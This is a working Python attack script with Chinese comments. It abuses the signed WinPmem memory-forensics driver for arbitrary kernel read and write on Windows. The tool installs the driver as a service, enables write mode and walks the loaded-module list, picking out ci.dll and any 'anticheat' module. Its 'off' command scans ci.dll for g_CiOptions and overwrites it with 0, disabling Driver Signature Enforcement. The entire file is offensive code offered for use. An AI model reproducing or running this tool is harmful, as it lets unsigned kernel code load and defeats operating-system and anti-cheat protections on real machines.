"""pmem_rw.py -- 直接对接已签名的 WinPmem 驱动（绕过只读版 LeechCore）

模式：PMEM_MODE_PTE(2) —— 之后 ReadFile/WriteFile 的 file offset 直接当**虚拟地址**用，
驱动自己用 CR3 走页表，所以内核地址也能直接读写。

用法：
  python pmem_rw.py info            # 打印 CR3 / KernBase / PsLoadedModuleList
  python pmem_rw.py read  <va> <n>  # 读内核 VA
  python pmem_rw.py mods            # 遍历 PsLoadedModuleList 找 ci.dll
  python pmem_rw.py scan            # 在 ci.dll 里找 g_CiOptions 候选
  python pmem_rw.py off|on          # 置 0（关 DSE）/ 置 6（恢复）
"""
import ctypes, struct, subprocess, sys, os
from ctypes import wintypes

DRV = r"E:\Users\MYX\Desktop\apex\downloads\forensics-reference\winpmem_x64.sys"
SVC = "ApexLabWinPmemProbe"
DEV = r"\\.\pmem"

GENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000
OPEN_EXISTING = 3
FILE_FLAG_OVERLAPPED = 0x40000000
FILE_SHARE_RW = 0x3
IOCTL_INFO = 0x22C40F
IOCTL_CTRL = 0x22C407
IOCTL_WRITE_ENABLE = 0x22C40B
PMEM_MODE_PTE = 2
NUMBER_OF_RUNS = 100
MEMINFO_SIZE = 8 * 4 + 8 * 64 + 8 * 4 + 8 * 0xFE + 8 + 16 * NUMBER_OF_RUNS  # 4216

class OVERLAPPED(ctypes.Structure):
    _fields_ = [("Internal", ctypes.c_void_p), ("InternalHigh", ctypes.c_void_p),
                ("Offset", wintypes.DWORD), ("OffsetHigh", wintypes.DWORD),
                ("hEvent", wintypes.HANDLE)]

k32 = ctypes.WinDLL("kernel32", use_last_error=True)
k32.CreateFileW.restype = wintypes.HANDLE
k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
                            wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
k32.DeviceIoControl.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
                                wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD),
                                wintypes.LPVOID]
k32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_int64, ctypes.POINTER(ctypes.c_int64), wintypes.DWORD]
k32.ReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
                         wintypes.LPVOID, ctypes.POINTER(OVERLAPPED)]
k32.WriteFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD,
                          wintypes.LPVOID, ctypes.POINTER(OVERLAPPED)]


def ensure_service():
    q = subprocess.run(["sc.exe", "query", SVC], capture_output=True, text=True)
    if "RUNNING" not in q.stdout:
        subprocess.run(["sc.exe", "create", SVC, "type=", "kernel", "start=", "demand",
                        "error=", "normal", "binPath=", DRV], capture_output=True)
        r = subprocess.run(["sc.exe", "start", SVC], capture_output=True, text=True)
        print("[*] " + (r.stdout.strip().splitlines() or ["start"])[-1])


class DEVICE:
    def __init__(self):
        ensure_service()
        self.h = k32.CreateFileW(DEV, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_RW,
                                 None, OPEN_EXISTING, 0, None)
        if self.h in (0, wintypes.HANDLE(-1).value):
            raise OSError(ctypes.get_last_error(), "CreateFile(\\\\.\\pmem)")
        self.info = self._get_info()
        self._set_mode(PMEM_MODE_PTE)

    def _get_info(self):
        buf = ctypes.create_string_buffer(MEMINFO_SIZE)
        got = wintypes.DWORD(0)
        if not k32.DeviceIoControl(self.h, IOCTL_INFO, None, 0, buf, MEMINFO_SIZE,
                                   ctypes.byref(got), None):
            raise OSError(ctypes.get_last_error(), "PMEM_INFO_IOCTRL")
        raw = buf.raw
        u64 = lambda off: struct.unpack_from('<Q', raw, off)[0]
        return {
            'cr3': u64(0), 'build': u64(8), 'kernbase': u64(16), 'kdbg': u64(24),
            'pfn': u64(32 + 512), 'psloaded': u64(40 + 512),
            'psactive': u64(48 + 512), 'nruns': u64(32 + 512 + 32 + 2032),
            'raw': raw,
        }

    def _set_mode(self, mode):
        m = wintypes.DWORD(mode)
        got = wintypes.DWORD(0)
        if not k32.DeviceIoControl(self.h, IOCTL_CTRL, ctypes.byref(m), 4, None, 0,
                                   ctypes.byref(got), None):
            raise OSError(ctypes.get_last_error(), "PMEM_CTRL_IOCTRL(mode)")

    def enable_write(self):
        v = wintypes.DWORD(1)
        got = wintypes.DWORD(0)
        ok = k32.DeviceIoControl(self.h, IOCTL_WRITE_ENABLE, ctypes.byref(v), 4, None, 0,
                                 ctypes.byref(got), None)
        return bool(ok)

    def _ov(self, va):
        ov = OVERLAPPED()
        ov.Offset = va & 0xFFFFFFFF
        ov.OffsetHigh = (va >> 32) & 0xFFFFFFFF
        ov.hEvent = k32.CreateEventW(None, True, False, None)
        return ov

    def _wait(self, ov):
        got = wintypes.DWORD(0)
        ok = k32.GetOverlappedResult(self.h, ctypes.byref(ov), ctypes.byref(got), True)
        k32.CloseHandle(ov.hEvent)
        return (bool(ok), got.value)

    def read(self, va, n):
        buf = ctypes.create_string_buffer(n)
        ov = self._ov(va)
        ok = k32.ReadFile(self.h, buf, n, None, ctypes.byref(ov))
        err = ctypes.get_last_error()
        if not ok and err != 997:
            k32.CloseHandle(ov.hEvent)
            return None
        ok, got = self._wait(ov)
        return buf.raw[:got] if ok else None

    def write(self, va, data):
        buf = ctypes.create_string_buffer(bytes(data), len(data))
        ov = self._ov(va)
        ok = k32.WriteFile(self.h, buf, len(data), None, ctypes.byref(ov))
        err = ctypes.get_last_error()
        if not ok and err != 997:
            k32.CloseHandle(ov.hEvent)
            return False
        ok, got = self._wait(ov)
        return ok and got == len(data)


def walk_modules(d):
    """遍历 PsLoadedModuleList，返回 [(name, base, size)]"""
    head = d.info['psloaded']
    out = []
    cur = struct.unpack('<Q', d.read(head, 8) or b'\0' * 8)[0]
    for _ in range(512):
        if cur == head or not cur:
            break
        ent = d.read(cur, 0x70)
        if not ent or len(ent) < 0x70:
            break
        nxt = struct.unpack_from('<Q', ent, 0)[0]
        base = struct.unpack_from('<Q', ent, 0x30)[0]
        size = struct.unpack_from('<I', ent, 0x40)[0]
        ln = struct.unpack_from('<H', ent, 0x58)[0]
        pb = struct.unpack_from('<Q', ent, 0x60)[0]
        name = ''
        if ln and pb:
            nb = d.read(pb, ln)
            if nb:
                name = nb.decode('utf-16-le', 'ignore')
        out.append((name, base, size))
        cur = nxt
    return out


def find_ci_options(d, base, size):
    img = d.read(base, size)
    if not img:
        return []
    cands = []
    for i in range(len(img) - 10):
        if img[i] == 0xC7 and img[i + 1] == 0x05:
            disp = struct.unpack_from('<i', img, i + 2)[0]
            imm = struct.unpack_from('<I', img, i + 6)[0]
            if imm not in (0, 1, 2, 6, 0xE):
                continue
            tgt_rva = i + 10 + disp
            if not (0 <= tgt_rva < size):
                continue
            va = base + tgt_rva
            cur = d.read(va, 4)
            if cur:
                cands.append((va, struct.unpack('<I', cur)[0], i))
    return cands


def main():
    if len(sys.argv) < 2:
        print(__doc__); return
    cmd = sys.argv[1]
    d = DEVICE()
    i = d.info
    print(f"[*] build={i['build'] & 0xFFFFFFFF}  CR3=0x{i['cr3']:X}  KernBase=0x{i['kernbase']:X}  "
          f"PsLoadedModuleList=0x{i['psloaded']:X}  runs={i['nruns']}")

    if cmd == 'read':
        va, n = int(sys.argv[2], 16), int(sys.argv[3])
        data = d.read(va, n)
        print(data.hex(' ') if data else 'FAILED')

    elif cmd == 'info':
        mz = d.read(i['kernbase'], 2)
        print(f"[*] KernBase first bytes: {mz.hex() if mz else 'FAILED'}")
        print(f"[*] write-enable: {d.enable_write()}")

    elif cmd == 'mods':
        mods = walk_modules(d)
        print(f"[*] {len(mods)} modules")
        for name, base, size in mods:
            if name.lower() in ('ci.dll', 'ntoskrnl.exe', 'win32k.sys') or 'anticheat' in name.lower():
                print(f"    {name:<24} base=0x{base:X} size=0x{size:X}")

    elif cmd in ('scan', 'off', 'on'):
        mods = walk_modules(d)
        ci = next((m for m in mods if m[0].lower() == 'ci.dll'), None)
        if not ci:
            print('[!] ci.dll not found'); return
        print(f"[*] ci.dll base=0x{ci[1]:X} size=0x{ci[2]:X}")
        cands = find_ci_options(d, ci[1], ci[2])
        print(f"[*] candidates={len(cands)}")
        for va, val, off in cands[:10]:
            print(f"    0x{va:X} value=0x{val:X} (ci+0x{va-ci[1]:X})")
        if cmd in ('off', 'on'):
            if not cands:
                print('[!] no candidate'); return
            pick = next(((v, x, o) for v, x, o in cands if x & 0x2 or x == 0xE), cands[0])
            va, val, _ = pick
            print(f"[*] write-enable: {d.enable_write()}")
            ok = d.write(va, struct.pack('<I', 0 if cmd == 'off' else 6))
            after = d.read(va, 4)
            print(f"[{'OK' if ok else 'FAIL'}] 0x{va:X}: 0x{val:X} -> "
                  f"{'0x%X' % struct.unpack('<I', after)[0] if after else '?'}")


if __name__ == '__main__':
    main()
